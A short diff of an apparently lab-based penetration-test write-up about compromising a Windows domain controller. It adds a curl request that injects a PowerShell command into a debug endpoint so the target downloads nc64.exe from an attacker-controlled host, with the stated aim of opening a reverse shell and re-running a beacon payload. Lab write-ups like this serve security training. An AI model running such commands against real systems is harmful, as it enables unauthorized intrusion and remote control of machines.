@@ -724,5 +724,11 @@ After some research and reading of the docs, i see i need to create a api config
 After some failed attempts at re executing the beacon with system privs and failing i think my only option is to upload nc64.exe then trigger a reverse shell then from there re execute the beacon payload
 
 ```python
+curl -X POST --negotiate -u : 'http://lus2dc.lustrous2.vl/File/Debug' --data "command=iwr http://10.10.14.61:9000/nc64.exe -OutFile \programdata\nc64.exe" --data "pin=ba45c518"
+```
+
+First ill install a release from github then trnasfer it to the server
+
+```python
 
 ```
